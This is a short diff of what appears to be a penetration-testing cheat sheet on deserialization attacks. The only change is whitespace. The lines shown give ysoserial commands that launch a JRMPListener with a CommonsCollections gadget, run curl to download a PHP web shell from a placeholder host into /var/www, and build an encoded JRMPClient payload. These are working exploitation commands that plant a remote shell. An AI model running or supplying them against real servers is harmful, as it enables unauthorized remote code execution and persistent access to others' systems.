@@ -396,7 +396,7 @@ java.io.IOException
   
 #### JRMPListener and JRMPClient (CommonsCollections)
   
-`java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”`
+`java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”`  
 `java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0`
   
 ### Python Deserialization
